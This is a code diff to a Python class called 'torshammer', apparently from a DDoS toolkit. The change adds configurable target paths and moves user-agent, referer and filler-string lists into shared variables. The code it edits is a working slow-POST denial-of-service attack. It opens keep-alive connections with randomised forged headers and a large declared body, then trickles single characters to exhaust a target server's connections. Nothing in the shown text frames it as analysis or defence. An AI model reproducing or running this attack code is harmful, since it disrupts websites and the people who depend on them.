@@ -15,14 +15,16 @@ class torshammer(DDoS_Class):
         logs=False,
         max_content=15000,
         min_content=10000,
-        ssl_on=False
+        ssl_on=False,
+        paths=['/']
     ):
+        self.paths=paths
         self.ssl_on=ssl_on
         self.counter = 0
         self.cookie = cookie
         self.user_agents = user_agents
         if not self.user_agents or len(self.user_agents) == 0:
-            self.user_agents = ua
+            self.user_agents = Common_Variables.user_agents_list
         self.max_content = max_content
         self.min_content = min_content
         self.stop = False
@@ -72,16 +74,16 @@ class torshammer(DDoS_Class):
                     s.send(
                         reorder_headers_randomly(
                             "POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(
-                                random.choice(paths),
+                                random.choice(self.paths),
                                 ck,
                                 random.choice(self.user_agents),
                                 random.randint(300, 1000),
                                 q,
                                 (
-                                    random.choice(referers)
-                                    + random.choice(lis)
+                                    random.choice(Common_Variables.referers_list)
+                                    + random.choice(Common_Variables.source_string)
                                     + str(random.randint(0, 100000000))
-                                    + random.choice(lis)
+                                    + random.choice(Common_Variables.source_string)
                                 ),
                                 self.target,
                             )
@@ -94,7 +96,7 @@ class torshammer(DDoS_Class):
                             break
                         if self.stop == True:
                             break
-                        h = random.choice(lis)
+                        h = random.choice(Common_Variables.source_string)
                         try:
                             s.send(h.encode("utf-8"))
                             if self.logs == True:
